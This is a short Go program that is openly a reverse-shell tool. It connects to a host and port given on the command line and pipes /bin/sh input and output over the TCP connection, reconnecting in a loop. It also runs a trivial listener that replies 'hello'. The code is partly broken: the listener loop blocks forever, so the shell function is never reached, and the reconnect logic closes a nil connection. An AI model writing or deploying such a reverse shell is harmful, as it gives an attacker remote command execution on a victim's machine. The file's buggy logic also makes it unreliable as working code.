package main

import (
	"flag"
	"fmt"
	"net"
	"os"
	"os/exec"
)

func main() {
	var host = flag.String("h", "host", "Specify the hostname or IP address")
	var port = flag.String("p", "port", "Specify the port number to connect to")
	var lport = flag.String("l", "listen", "Specify a listening port on the machine example of the flag -l 80")
	flag.Parse()
	listen(*lport)
	revshell(*host, *port)
}

func revshell(host string, port string) {
	fulladdr := host + ":" + port
	fmt.Println(fulladdr)
	c, err := net.Dial("tcp", fulladdr)
	if err != nil {
		if err != nil {
			c.Close()
		}
		revshell(host, port)
	}
	if err != nil {
		c.Close()
		revshell(host, port)
		return
	}
	cmd := exec.Command("/bin/sh")
	cmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c
	cmd.Run()
	c.Close()
	revshell(host, port)
}
func listen(port string) {
	fmt.Println("Listening on " + "localhost" + ":" + port)
	l, err := net.Listen("tcp", ""+":"+port)
	if err != nil {
		fmt.Println("Error listening:", err.Error())
		os.Exit(1)
	}
	fmt.Println("Listening on " + "localhost" + ":" + port)
	// Close the listener when the application closes.
	defer l.Close()
	for {
		// Listen for an incoming connection.
		conn, err := l.Accept()
		if err != nil {
			fmt.Println("Error accepting: ", err.Error())
			os.Exit(1)
		}
		// Handle connections in a new goroutine.
		handleRequest(conn)
	}
}

func handleRequest(conn net.Conn) {
	// Make a buffer to hold incoming data.
	buf := make([]byte, 1024)
	// Read the incoming connection into the buffer.
	_, err := conn.Read(buf)
	if err != nil {
		fmt.Println("Error reading:", err.Error())
	}
	// Send a response back to person contacting us.
	conn.Write([]byte("hello"))

	conn.Close()

}
